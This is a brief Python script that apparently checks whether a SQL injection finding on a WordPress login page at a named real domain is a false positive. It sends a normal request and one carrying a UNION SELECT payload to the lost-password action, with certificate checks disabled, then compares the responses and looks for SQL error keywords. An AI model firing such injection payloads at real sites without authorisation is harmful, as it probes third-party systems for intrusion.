#!/usr/bin/env python3
import requests
import re

url = "https://yoshikkeh.com/wp-login.php"

# Test 1: Normal request
print("[*] Testing normal request...")
r_normal = requests.get(f"{url}?action=lostpassword", verify=False)
print(f"Status: {r_normal.status_code}")
print(f"Length: {len(r_normal.text)} chars")
print(f"Title: {r_normal.text[:100]}...")

print("\n[*] Testing with SQL payload...")
# Test 2: With SQL payload
r_sql = requests.get(f"{url}?action=lostpassword' UNION SELECT NULL-- ", verify=False)
print(f"Status: {r_sql.status_code}")
print(f"Length: {len(r_sql.text)} chars")
print(f"First 200 chars: {r_sql.text[:200]}")

print("\n[*] Comparing responses...")
if r_normal.text == r_sql.text:
    print("✅ Responses are IDENTICAL - Likely FALSE POSITIVE")
elif len(r_normal.text) != len(r_sql.text):
    print("⚠️  Different lengths - Need further investigation")
    print(f"Difference: {len(r_sql.text) - len(r_normal.text)} chars")
else:
    print("⚠️  Same length but content differs")

# Check for SQL keywords
sql_keywords = ['sql', 'mysql', 'database', 'syntax', 'error', 'warning']
found = []
for keyword in sql_keywords:
    if keyword in r_sql.text.lower():
        found.append(keyword)

if found:
    print(f"⚠️  Found SQL keywords: {', '.join(found)}")
else:
    print("✅ No SQL keywords found - Likely FALSE POSITIVE")

# Check for WordPress login page indicators
if 'wp-admin' in r_sql.text or 'wp-login.php' in r_sql.text:
    print("✅ This is a WordPress login page")
    
# Check if it's a redirect
if r_sql.history:
    print(f"⚠️  Request was redirected: {len(r_sql.history)} redirect(s)")
    for resp in r_sql.history:
        print(f"  → {resp.status_code} {resp.url}")
